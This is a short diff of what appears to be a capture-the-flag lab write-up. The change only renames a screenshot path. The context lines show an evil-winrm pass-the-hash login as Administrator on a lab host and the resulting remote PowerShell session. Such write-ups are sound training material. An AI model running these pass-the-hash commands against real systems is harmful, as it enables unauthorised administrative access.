@@ -477,7 +477,7 @@ kali@kali$ evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e6504
 *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
 ```
 
-![Administrator shell via pass-the-hash](POC/GOTrootshell.png)
+![Administrator shell via pass-the-hash](POC/GotRootShell.png)
 
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
